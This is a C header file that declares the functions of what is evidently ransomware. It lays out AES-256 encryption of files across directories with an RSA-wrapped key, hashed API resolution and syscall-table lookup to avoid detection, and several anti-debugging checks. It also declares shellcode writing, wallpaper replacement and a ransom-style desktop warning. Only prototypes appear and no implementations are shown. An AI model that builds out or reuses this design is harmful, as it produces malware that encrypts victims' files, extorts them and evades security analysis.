#pragma once
#include<windows.h>
#include"structs.h"
#include"aes.h"


#define AES_256_KEY_SIZE  32 
#define IV_SIZE    16  

VOID NTAPI RtlInitUnicodeString(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
);

VOID InitializeObjectAttributes(
	POBJECT_ATTRIBUTES InitializedAttributes,
	PUNICODE_STRING ObjectName,
	ULONG Attributes,
	HANDLE RootDirectory,
	PVOID SecurityDescriptor
);

BOOL AddPadding(uint8_t* data, SIZE_T* data_len);
BOOL GenerateKey(uint8_t* keyValue, uint8_t* iv);
VOID AESencryptFile(uint8_t key[AES_256_KEY_SIZE], uint8_t iv[IV_SIZE], uint8_t plaintext[IV_SIZE]);
BOOL ReadFromFile(PBYTE* pData, WCHAR* filePath, SIZE_T* szData);
BOOL WriteToFile(PBYTE buffer, WCHAR* filePath, SIZE_T numberOfBytesToWrite);
BOOL DirectoryFiles(WCHAR* pDirectoryPath, uint8_t* key, uint8_t* iv);


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ LPCWSTR String);

PTEB RtlGetThreadEnvironmentBlock();

VOID InitializeRandomValue();

BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);

HMODULE GetModuleHandleH(UINT32 dllName);

FARPROC GetProcAddressH(HMODULE hMoulde, LPCSTR lpProcName);


BOOL RSAwork(uint8_t* keyValue,WCHAR* keyPath);


BOOL CheckProcessDebugFlags();

BOOL CheckProcessDebugPort();

BOOL CheckTimingAnomaly();

BOOL CheckHardwareBreakpoints();

BOOL CheckUsingExceptions();

BOOL CheckIsDebuggerPresent();

BOOL CheckRemoteDebugger();

BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char* filePath);

BOOL SetWallpaper(LPCWSTR wallpaperPath);

BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

VOID WriteWarningToDesktop();

BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shellcode, DWORD shellcodeSize, WNDPROC windowProc);
